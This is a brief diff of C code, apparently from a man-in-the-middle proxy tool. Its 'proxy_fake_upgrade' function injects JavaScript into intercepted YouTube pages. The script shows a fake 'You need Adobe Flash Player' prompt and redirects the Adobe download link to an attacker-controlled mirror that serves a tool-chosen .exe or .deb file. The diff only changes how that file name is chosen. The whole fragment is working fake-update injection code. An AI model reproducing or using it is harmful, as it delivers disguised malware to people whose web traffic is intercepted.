@@ -143,7 +143,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 		"        if(!msg && ('innerHTML' in player)) { var msg = player.innerHTML; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
 		"        if(!msg) var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"http://get.adobe.com/flashplayer/\">Download it from Adobe.</a>';\n" \
 		"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\"><div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('http://get.adobe.com/flashplayer/', adobelocalmirror).trim() + '</div></div></div>';\n", 
-		os == WINDOWS ? file : "FlashSetup-11.2.2", os == WINDOWS ? ".exe" : ".deb"); // os == OSX ? ".dmg" : ".deb");
+		file, os == WINDOWS ? ".exe" : ".deb"); // os == OSX ? ".dmg" : ".deb");
 
 	 ON_ERROR(html_to_inject, NULL, "virtual memory exhausted");
 
